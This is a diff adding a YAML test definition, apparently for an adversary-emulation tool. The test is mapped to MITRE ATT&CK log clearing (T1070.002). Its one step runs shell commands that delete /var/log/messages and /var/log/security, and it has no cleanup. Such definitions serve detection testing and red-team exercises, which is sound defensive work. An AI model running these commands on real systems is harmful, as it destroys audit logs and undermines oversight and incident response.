@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: rm -rf
+description: |
+    Delete messages and security logs
+uuid: bd8ccc45-d632-481e-b7cf-c467627d68f9
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1070: Indicator Removal'
+    subtechniques:
+        - 'T1070.002: Clear Linux or Mac System Logs'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: rm--rf
+      inline: |
+        rm -rf /var/log/messages
+        rm -rf /var/log/security
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
